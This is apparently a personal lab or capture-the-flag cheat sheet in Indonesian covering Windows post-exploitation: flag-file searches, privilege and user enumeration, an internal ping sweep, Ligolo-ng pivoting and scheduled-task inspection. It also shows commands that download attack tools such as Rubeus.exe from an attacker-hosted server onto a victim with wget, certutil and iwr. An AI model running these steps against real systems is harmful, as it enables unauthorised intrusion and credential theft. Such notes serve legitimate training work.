# User.txt
## Cari User di directory lain
```powershell
# Cari di semua Desktop semua user
dir C:\Users\*\Desktop\user.txt /s /b 2>nul

# Atau lebih luas
dir C:\Users\ /s /b 2>nul | findstr /i "user.txt\|local.txt\|proof.txt"
```
# Enum Saya
### siapa saya?
```powershell
whoami
whoami /priv #dahulukan ini
whoami /group
systeminfo
```
![](Attachments/Pasted%20image%2020260625053212.png)

cek windows version use `systeminfo` command
![](Attachments/Pasted%20image%2020260629103715.png)
### dimana saya?
```powershell
hostname #cek komputer apa
ipconfig #cek apakah ada another network
```
pada gambar dibawah ada another network
![](Attachments/Pasted%20image%2020260625053943.png)

#### Scan internal network
```powershell
1..255 | ForEach-Object { $ip = "192.168.100.$_"; if (Test-NetConnection -ComputerName $ip -InformationLevel Quiet -ErrorAction SilentlyContinue) { $ip } }
```
![](Attachments/Pasted%20image%2020260625094620.png)
### Siapa saja usernya?
```powershell
net usern
net localgroup administrator
```
![](Attachments/Pasted%20image%2020260625054311.png)

# Pivoting
## Ligolo-ng
download ligolo agent
[Releases · nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases) 

# Schedule Task
## Siapa yang menjalankan program UpdateChecker Agent (misal)?
```powershell
# Versi CMD  
schtasks /query /tn "UpdateChecker Agent" /fo list /v  
  
# Versi Powershell  
Get-ScheduledTask -TaskName "UpdateChecker Agent"  
  
# Versi Manual  
$s = New-Object -ComObject "Schedule.Service"; $s.Connect(); $s.GetFolder("\").GetTask("UpdateChecker Agent").Definition.Principal
```
![](Attachments/Pasted%20image%2020260704110707.png)
## Apa yang dijalankkanya?
```powershell
$s = New-Object -ComObject "Schedule.Service"; $s.Connect(); $s.GetFolder("\").GetTask("UpdateChecker Agent").Definition.Actions 
```
![](Attachments/Pasted%20image%2020260704110800.png)
# Download
```powershell
download "C:\Program Files\UpdateMonitor\UpdateMonitor.exe"
```
# Upload
```powershell
upload '/home/kali/forensic-tools/volatility3-win-exes-2.28.0/vol.exe' 'C:\Windows\Temp\vol.exe'

# Verify
ls C:\Windows\Temp\vol.exe
```
dari web server
```shell
# Attacker machine
python3 -m http.server 8088

# Victimm machine
wget http://10.10.14.38:8088/<file>

# kalau filenya besar
certutil -urlcache -split -f http://10.10.14.38:8088/Rubeus.exe Rubeus.exe

# alternative powershell
iwr -uri http://10.10.16.84:9090/Settings_Update.zip -OutFile Settings_Update.zip

```

